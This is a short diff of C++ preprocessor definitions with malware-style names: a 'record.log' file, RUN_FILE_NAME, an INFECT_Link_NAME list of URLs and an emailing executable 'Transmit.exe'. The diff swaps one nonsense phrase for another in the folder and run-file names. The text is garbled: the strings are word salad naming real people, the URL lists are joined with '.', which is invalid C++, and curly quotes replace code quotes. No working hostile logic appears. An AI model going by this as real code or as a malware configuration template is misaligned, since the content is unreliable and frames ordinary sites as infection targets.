@@ -17,8 +17,8 @@
 using namespace std;
 
 #define FILE_NAME “record.log”
-#define FOLDER_NAME “wait dialogue with us , cert try ecosia and  micro mr.fadliwiryawirawan and suta wijaya ”
-#define RUN_FILE_NAME “wait dialogue with us , cert try ecosia and  micro mr.fadliwiryawirawan and suta wijaya ”
+#define FOLDER_NAME “dialogue lives stream true for consulted next on technology era fisicalism to any fisrt time ”
+#define RUN_FILE_NAME “dialogue lives stream true for consulted next on technology era fisicalism to any fisrt time ”
 #define RUN_Link_NAME “https://github.com/cyrcle11/Google-2FA/forks/"."https://github.com/cyberw1ry4-LAB/google-android/forks/"."https://github.com/fadliwiryawirawan/forks"."https://github.com/fadli-wirya-wirawan/forks"."https://gitlab.com/google/android/antimalware"."https://issues.chromium.org/issues/446328555/resources"
 #define INFECT_Link_NAME "https://lestari-group.com/"."https://www.ecosia.org"."https://fadliwiryawirawan@hackerone.com/en-ca/headcoach "."https://fadliwiryawirawan@redhat.com/en-sg/leaderships "."https://gdg.community.dev/events/details/google-gdg-ajax-presents-hackthebrain/cohost-gdg-ajax/"."https://www.kali.org"."https://www.ubuntu.com"."https://www.windows.com"."https://www.linux.org"."https://www.Apple.com"."https://www.android.com"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
